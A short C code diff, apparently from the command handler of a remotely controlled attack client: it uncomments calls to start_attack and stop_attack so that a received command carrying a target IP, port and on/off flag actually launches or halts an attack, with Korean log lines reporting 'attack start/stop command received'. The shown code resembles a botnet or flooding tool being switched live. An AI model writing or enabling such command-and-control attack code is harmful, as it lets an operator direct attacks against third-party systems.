@@ -228,10 +228,10 @@ static void* recv_thread(void* arg) {
         int port = ntohs(cmd.target_port);
 
         if (cmd.state == 1) {
-            // start_attack(ip_str, port);
+            start_attack(ip_str, port);
             printf("%s:%d 에게 공격 시작 명령 수신\n", ip_str, port);
         } else {
-            // stop_attack();
+            stop_attack();
             printf("%s:%d 에게 공격 중지 명령 수신\n", ip_str, port);
         }
     }
